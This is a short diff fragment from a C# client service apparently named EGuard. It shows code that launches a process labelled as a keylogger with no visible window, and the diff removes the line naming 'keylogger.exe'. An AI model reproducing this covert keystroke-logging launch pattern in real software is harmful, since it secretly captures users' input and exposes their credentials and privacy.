@@ -47,7 +47,7 @@ namespace EGuardClientService
             {
                 myKeylogger.StartInfo.UseShellExecute = false;
                 // start keylogger process
-                myKeylogger.StartInfo.FileName = "keylogger.exe";
+                
                 myKeylogger.StartInfo.CreateNoWindow = true;
                 myKeylogger.Start();
                 // This code assumes the process you are starting will terminate itself.  
